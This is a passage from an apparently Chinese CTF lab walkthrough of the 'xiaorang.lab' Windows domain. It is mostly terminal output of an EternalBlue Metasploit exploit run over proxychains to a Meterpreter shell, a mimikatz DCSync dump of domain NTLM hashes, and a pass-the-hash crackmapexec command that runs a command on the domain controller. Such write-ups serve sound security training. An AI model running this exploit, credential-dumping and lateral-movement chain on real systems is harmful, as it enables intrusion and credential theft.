+</span></span><span class=line><span class=cl>   <span class=m>19</span>  auxiliary/admin/smb/ms17_010_command                  2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+</span></span><span class=line><span class=cl>   <span class=m>20</span>    <span class=se>\_</span> AKA: ETERNALSYNERGY                              .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>21</span>    <span class=se>\_</span> AKA: ETERNALROMANCE                              .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>22</span>    <span class=se>\_</span> AKA: ETERNALCHAMPION                             .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>23</span>    <span class=se>\_</span> AKA: ETERNALBLUE                                 .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>24</span>  auxiliary/scanner/smb/smb_ms17_010                    .                normal   No     MS17-010 SMB RCE Detection
+</span></span><span class=line><span class=cl>   <span class=m>25</span>    <span class=se>\_</span> AKA: DOUBLEPULSAR                                .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>26</span>    <span class=se>\_</span> AKA: ETERNALBLUE                                 .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>27</span>  exploit/windows/fileformat/office_ms17_11882          2017-11-15       manual   No     Microsoft Office CVE-2017-11882
+</span></span><span class=line><span class=cl>   <span class=m>28</span>  auxiliary/admin/mssql/mssql_escalate_execute_as       .                normal   No     Microsoft SQL Server Escalate EXECUTE AS
+</span></span><span class=line><span class=cl>   <span class=m>29</span>  auxiliary/admin/mssql/mssql_escalate_execute_as_sqli  .                normal   No     Microsoft SQL Server SQLi Escalate Execute AS
+</span></span><span class=line><span class=cl>   <span class=m>30</span>  exploit/windows/smb/smb_doublepulsar_rce              2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+</span></span><span class=line><span class=cl>   <span class=m>31</span>    <span class=se>\_</span> target: Execute payload <span class=o>(</span>x64<span class=o>)</span>                    .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>32</span>    <span class=se>\_</span> target: Neutralize implant                       .                .        .      .
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Interact with a module by name or index. For example info 32, use <span class=m>32</span> or use exploit/windows/smb/smb_doublepulsar_rce
+</span></span><span class=line><span class=cl>After interacting with a module you can manually <span class=nb>set</span> a TARGET with <span class=nb>set</span> TARGET <span class=s1>&#39;Neutralize implant&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl>msf &gt; use exploit/windows/smb/ms17_010_eternalblue
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl>msf exploit<span class=o>(</span>windows/smb/ms17_010_eternalblue<span class=o>)</span> &gt; <span class=nb>set</span> payload windows/x64/meterpreter/bind_tcp_uuid
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=nv>payload</span> <span class=o>=</span>&gt; windows/x64/meterpreter/bind_tcp_uuid
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl>msf exploit<span class=o>(</span>windows/smb/ms17_010_eternalblue<span class=o>)</span> &gt; <span class=nb>set</span> RHOSTS 172.22.1.21
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=nv>RHOSTS</span> <span class=o>=</span>&gt; 172.22.1.21
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl>msf exploit<span class=o>(</span>windows/smb/ms17_010_eternalblue<span class=o>)</span> &gt; run
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 172.22.1.21:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.1.21:445  ...  OK
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.1.21:135  ...  OK
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 172.22.1.21:445       - Host is likely VULNERABLE to MS17-010! - Windows Server <span class=m>2008</span> R2 Enterprise <span class=m>7601</span> Service Pack <span class=m>1</span> x64 <span class=o>(</span>64-bit<span class=o>)</span>
+</span></span><span class=line><span class=cl>/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.21/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator <span class=s1>&#39;+&#39;</span> and <span class=s1>&#39;?&#39;</span> was replaced with <span class=s1>&#39;*&#39;</span> in regular expression
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 172.22.1.21:445       - Scanned <span class=m>1</span> of <span class=m>1</span> hosts <span class=o>(</span>100% <span class=nb>complete</span><span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 172.22.1.21:445 - The target is vulnerable.
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 172.22.1.21:445 - Connecting to target <span class=k>for</span> exploitation.
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.1.21:445  ...  OK
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 172.22.1.21:445 - Connection established <span class=k>for</span> exploitation.
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 172.22.1.21:445 - Target OS selected valid <span class=k>for</span> OS indicated by SMB reply
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 172.22.1.21:445 - CORE raw buffer dump <span class=o>(</span><span class=m>53</span> bytes<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 172.22.1.21:445 - 0x00000000  <span class=m>57</span> <span class=m>69</span> 6e <span class=m>64</span> 6f <span class=m>77</span> <span class=m>73</span> <span class=m>20</span> <span class=m>53</span> <span class=m>65</span> <span class=m>72</span> <span class=m>76</span> <span class=m>65</span> <span class=m>72</span> <span class=m>20</span> <span class=m>32</span>  Windows Server <span class=m>2</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 172.22.1.21:445 - 0x00000010  <span class=m>30</span> <span class=m>30</span> <span class=m>38</span> <span class=m>20</span> <span class=m>52</span> <span class=m>32</span> <span class=m>20</span> <span class=m>45</span> 6e <span class=m>74</span> <span class=m>65</span> <span class=m>72</span> <span class=m>70</span> <span class=m>72</span> <span class=m>69</span> <span class=m>73</span>  <span class=m>008</span> R2 Enterpris
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 172.22.1.21:445 - 0x00000020  <span class=m>65</span> <span class=m>20</span> <span class=m>37</span> <span class=m>36</span> <span class=m>30</span> <span class=m>31</span> <span class=m>20</span> <span class=m>53</span> <span class=m>65</span> <span class=m>72</span> <span class=m>76</span> <span class=m>69</span> <span class=m>63</span> <span class=m>65</span> <span class=m>20</span> <span class=m>50</span>  e <span class=m>7601</span> Service P
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 172.22.1.21:445 - 0x00000030  <span class=m>61</span> <span class=m>63</span> 6b <span class=m>20</span> <span class=m>31</span>                                   ack <span class=m>1</span>           
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 172.22.1.21:445 - Target arch selected valid <span class=k>for</span> arch indicated by DCE/RPC reply
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 172.22.1.21:445 - Trying exploit with <span class=m>12</span> Groom Allocations.
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 172.22.1.21:445 - Sending all but last fragment of exploit packet
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 172.22.1.21:445 - Starting non-paged pool grooming
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.1.21:445  ...  OK
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 172.22.1.21:445 - Sending SMBv2 buffers
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.1.21:445  ...  OK
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.1.21:445  ...  OK
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.1.21:445  ...  OK
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.1.21:445  ...  OK
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.1.21:445  ...  OK
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.1.21:445  ...  OK
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.1.21:445  ...  OK
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.1.21:445  ...  OK
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.1.21:445  ...  OK
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.1.21:445  ...  OK
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.1.21:445  ...  OK
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.1.21:445  ...  OK
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.1.21:445  ...  OK
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 172.22.1.21:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 172.22.1.21:445 - Sending final SMBv2 buffers.
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.1.21:445  ...  OK
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.1.21:445  ...  OK
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.1.21:445  ...  OK
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.1.21:445  ...  OK
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.1.21:445  ...  OK
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.1.21:445  ...  OK
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 172.22.1.21:445 - Sending last fragment of exploit packet!
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 172.22.1.21:445 - Receiving response from exploit packet
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 172.22.1.21:445 - ETERNALBLUE overwrite completed successfully <span class=o>(</span>0xC000000D<span class=o>)</span>!
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 172.22.1.21:445 - Sending egg to corrupted connection.
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 172.22.1.21:445 - Triggering free of corrupted buffer.
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Started <span class=nb>bind</span> TCP handler against 172.22.1.21:4444
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.1.21:4444  ...  OK
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>203846</span> bytes<span class=o>)</span> to 172.22.1.21
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Meterpreter session <span class=m>1</span> opened <span class=o>(</span>192.168.5.128:41824 -&gt; 38.55.99.185:1123<span class=o>)</span> at 2025-11-05 20:48:51 +0800
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 172.22.1.21:445 - <span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 172.22.1.21:445 - <span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-WIN-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 172.22.1.21:445 - <span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span></code></pre></div><p>关于这部分的解释，参考deepseek即可<br><a href=https://chat.deepseek.com/share/djha7r1etl8m9x4ss0>https://chat.deepseek.com/share/djha7r1etl8m9x4ss0</a></p><p>然后去获取域内用户的hash，最后连接即可</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>meterpreter &gt; getuid
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl>Server username: NT AUTHORITY<span class=se>\S</span>YSTEM
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl>meterpreter &gt; load kiwi
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl>Loading extension kiwi...
+</span></span><span class=line><span class=cl>  .#####.   mimikatz 2.2.0 <span class=m>20191125</span> <span class=o>(</span>x64/windows<span class=o>)</span>
+</span></span><span class=line><span class=cl> .## ^ <span class=c1>##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)</span>
+</span></span><span class=line><span class=cl> <span class=c1>## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
+</span></span><span class=line><span class=cl> <span class=c1>## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
+</span></span><span class=line><span class=cl> <span class=s1>&#39;## v ##&#39;</span>        Vincent LE TOUX            <span class=o>(</span> vincent.letoux@gmail.com <span class=o>)</span>
+</span></span><span class=line><span class=cl>  <span class=s1>&#39;#####&#39;</span>         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Success.
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl>meterpreter &gt; kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>DC<span class=o>]</span> <span class=s1>&#39;xiaorang.lab&#39;</span> will be the domain
+</span></span><span class=line><span class=cl><span class=o>[</span>DC<span class=o>]</span> <span class=s1>&#39;DC01.xiaorang.lab&#39;</span> will be the DC server
+</span></span><span class=line><span class=cl><span class=o>[</span>DC<span class=o>]</span> Exporting domain <span class=s1>&#39;xiaorang.lab&#39;</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>rpc<span class=o>]</span> Service  : ldap
+</span></span><span class=line><span class=cl><span class=o>[</span>rpc<span class=o>]</span> AuthnSvc : GSS_NEGOTIATE <span class=o>(</span>9<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=m>502</span>     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        <span class=m>514</span>
+</span></span><span class=line><span class=cl><span class=m>1106</span>    Marcus  e07510a4284b3c97c8e7dee970918c5c        <span class=m>512</span>
+</span></span><span class=line><span class=cl><span class=m>1107</span>    Charles f6a9881cd5ae709abb4ac9ab87f24617        <span class=m>512</span>
+</span></span><span class=line><span class=cl><span class=m>1000</span>    DC01$   28462b35265440e802ac0d118ea9941d        <span class=m>532480</span>
+</span></span><span class=line><span class=cl><span class=m>500</span>     Administrator   10cf89a850fb1cdbe6bb432b859164c8        <span class=m>512</span>
+</span></span><span class=line><span class=cl><span class=m>1104</span>    XIAORANG-OA01$  b69c24b4e495904afbdee7546a1d9e42        <span class=m>4096</span>
+</span></span><span class=line><span class=cl><span class=m>1108</span>    XIAORANG-WIN7$  4df3570cf16f129c5a48cffc544a6676        <span class=m>4096</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl>meterpreter &gt; proxychains crackmapexec smb 172.22.1.2 -u administrator -H 10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x <span class=s2>&#34;type Users\Administrator\flag\flag03.txt&#34;</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Unknown command: proxychains. Run the <span class=nb>help</span> <span class=nb>command</span> <span class=k>for</span> more details.
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span></code></pre></div><p>最后一连，执行命令,type出flag<br>得到flag3</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>/home/kali<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# proxychains crackmapexec smb 172.22.1.2 -u administrator -H 10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x <span class=s2>&#34;type Users\Administrator\flag\flag03.txt&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> config file found: /etc/proxychains4.conf
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.1.2:445  ...  OK
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.1.2:135  ...  OK
+</span></span><span class=line><span class=cl>SMB         172.22.1.2      <span class=m>445</span>    DC01             <span class=o>[</span>*<span class=o>]</span> Windows Server <span class=m>2016</span> Datacenter <span class=m>14393</span> x64 <span class=o>(</span>name:DC01<span class=o>)</span> <span class=o>(</span>domain:xiaorang.lab<span class=o>)</span> <span class=o>(</span>signing:True<span class=o>)</span> <span class=o>(</span>SMBv1:True<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.1.2:445  ...  OK
+</span></span><span class=line><span class=cl>SMB         172.22.1.2      <span class=m>445</span>    DC01             <span class=o>[</span>+<span class=o>]</span> xiaorang.lab<span class=se>\a</span>dministrator:10cf89a850fb1cdbe6bb432b859164c8 <span class=o>(</span>Pwn3d!<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.1.2:135  ...  OK
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.1.2:49666  ...  OK
+</span></span><span class=line><span class=cl>SMB         172.22.1.2      <span class=m>445</span>    DC01             <span class=o>[</span>+<span class=o>]</span> Executed <span class=nb>command</span> 
+</span></span><span class=line><span class=cl>SMB         172.22.1.2      <span class=m>445</span>    DC01             ___   ___
+</span></span><span class=line><span class=cl>SMB         172.22.1.2      <span class=m>445</span>    DC01             <span class=se>\\</span> / /       / /    // <span class=p>|</span> <span class=p>|</span>     //   <span class=o>)</span> <span class=o>)</span> //   <span class=o>)</span> <span class=o>)</span>  // <span class=p>|</span> <span class=p>|</span>     /<span class=p>|</span>    / / //   <span class=o>)</span> <span class=o>)</span>
+</span></span><span class=line><span class=cl>SMB         172.22.1.2      <span class=m>445</span>    DC01             <span class=se>\ </span> /       / /    //__<span class=p>|</span> <span class=p>|</span>    //   / / //___/ /  //__<span class=p>|</span> <span class=p>|</span>    //<span class=p>|</span>   / / //
+</span></span><span class=line><span class=cl>SMB         172.22.1.2      <span class=m>445</span>    DC01             / /       / /    / ___  <span class=p>|</span>   //   / / / ___ <span class=o>(</span>   / ___  <span class=p>|</span>   // <span class=p>|</span>  / / //  ____
+</span></span><span class=line><span class=cl>SMB         172.22.1.2      <span class=m>445</span>    DC01             / /<span class=se>\\</span>     / /    //    <span class=p>|</span> <span class=p>|</span>  //   / / //   <span class=p>|</span> <span class=p>|</span>  //    <span class=p>|</span> <span class=p>|</span>  //  <span class=p>|</span> / / //    / /
